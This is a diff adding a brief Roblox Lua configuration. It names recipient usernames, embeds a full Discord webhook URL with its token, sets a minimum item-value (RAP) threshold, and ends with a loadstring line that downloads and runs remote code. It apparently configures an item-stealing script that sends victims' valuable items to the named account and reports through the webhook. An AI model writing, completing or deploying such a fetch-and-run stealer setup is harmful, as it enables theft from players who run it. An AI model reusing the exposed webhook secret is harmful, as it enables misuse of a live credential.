@@ -1,0 +1,9 @@
+Username = "niutdb1alt"
+Username2 = "niutdb1alt"
+Webhook = "https://discord.com/api/webhooks/1208563961864257658/K_yZzDDO-806jgvmWDu9txWuzAHrwW2b1KHOy9-UzBTTtFFtm0hs8CoZLi_9_mnwcSBI"
+
+LoadingScreen = false
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("link here"))()
